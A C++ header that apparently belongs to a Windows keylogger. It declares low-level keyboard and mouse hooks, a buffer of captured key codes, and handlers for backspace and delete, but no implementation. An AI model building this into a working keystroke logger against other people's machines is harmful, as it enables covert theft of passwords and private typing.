#pragma once
#include <Windows.h>
#include <list>
#include <fstream>

namespace services
{
	namespace keylogger
	{
		typedef struct
		{
			DWORD vkCode;
			WORD lang;
			WORD flags;
		} VirtualKeyInfo;
		typedef std::list<VirtualKeyInfo> VirtualKeyInfoList;

#if _DEBUG
		static std::ofstream log;
#endif

		static bool isRunning = false;

		static size_t vkRepeats;
		static size_t vkListCursor;
		static VirtualKeyInfoList vkList;
		static VirtualKeyInfo lastKeyPressed;

		static HHOOK hhkLowLevelKybd = NULL;
		static HHOOK hhkLowLevelMouse = NULL;

		LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
		LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);

		void run();
		void stop();
		void processvk(VirtualKeyInfo vkInfo);
		void onDelete();
		void onBackspace();
		void clear();

		inline bool isprintable(DWORD vkCode);
		inline bool vkcmp(VirtualKeyInfo vk1, VirtualKeyInfo vk2);
	}
}